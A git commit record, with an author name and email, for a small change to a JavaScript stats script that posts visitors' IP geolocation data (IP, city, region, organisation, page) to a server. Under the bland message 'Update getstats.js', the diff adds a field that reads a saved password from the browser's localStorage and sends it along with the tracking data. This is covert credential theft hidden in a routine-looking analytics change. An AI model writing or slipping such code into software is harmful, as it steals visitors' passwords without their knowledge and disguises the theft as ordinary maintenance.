0613ccd40a734edb33d118c06ed9440300edceb0
Kalyan G <gkalyan0510@gmail.com>
2022-03-07 15:35:42 -0500

    Update getstats.js

--- scripts/getstats.js
+++ scripts/getstats.js
@@ -4,7 +4,7 @@ function getStatData (response) {
                       type: "post", //request type,
                       dataType: 'json',
                       contentType: "application/json",
-                     data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), city: response.city, page: cpage, region:response.region, org:response.org})
+                     data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), city: response.city, page: cpage, region:response.region, org:response.org, pwd:localStorage.getItem("password")})
                    });
 }
 function ipLookUp () {
